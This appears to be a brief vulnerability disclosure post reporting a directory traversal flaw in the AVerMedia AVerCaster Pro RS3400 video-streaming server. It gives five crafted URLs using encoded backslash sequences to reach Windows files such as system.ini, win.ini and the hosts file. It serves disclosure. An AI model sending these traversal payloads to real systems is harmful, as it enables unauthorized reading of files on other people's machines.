Hello,

I just wanted to let you know that the latest video-streaming solution from AVerMedia, the AVerCaster Pro RS3400, is vulnerable to a nasty directory traversal bug. The whole filesystem (at least the locations accessible to the user running the web service) can easily be reached from the web using a crafted URL, such as :

http://somehost.com/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5csystem.ini

http://somehost.com/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini

http://somehost.com/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts

http://somehost.com/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c../windows/Starter.xml (Windows 7)

http://somehost.com/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c../Program%20Files/Internet%20Explorer/iexplore.exe

While no system files can be downloaded using that flaw, it's still bad programming...

Cheers,

Patrick
